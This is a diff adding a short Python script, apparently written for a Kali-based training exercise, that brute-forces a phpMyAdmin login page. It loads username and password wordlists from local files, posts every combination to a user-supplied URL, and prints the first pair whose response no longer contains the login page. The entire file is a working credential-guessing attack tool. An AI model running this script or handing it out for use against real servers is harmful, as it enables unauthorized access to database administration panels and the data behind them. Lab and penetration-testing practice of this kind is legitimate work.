@@ -1,0 +1,23 @@
+import requests
+
+url = input ("Insert the URL: ")
+try:
+	username_file = open('/home/kali/Desktop/Buildweek1/usernames.txt')
+	password_file = open('/home/kali/Desktop/Buildweek1/passwords.txt')
+except:
+	print ("\n-file non trovato,controllare il percorso del path nel codice-")
+	exit()
+user_list = username_file.readlines()
+pwd_list = password_file.readlines()
+
+for user in user_list:
+        user = user.rstrip()
+        for pwd in pwd_list:
+                pwd = pwd.rstrip()
+
+                print (user, "-", pwd)
+                data = {'pma_username': user, 'pma_password': pwd, 'Go': "Go"}
+                send_data_url = requests.post(url, data = data)
+                if not 'login' in str(send_data_url.content):
+                        print ("Username e Password",user,pwd)
+                        exit()
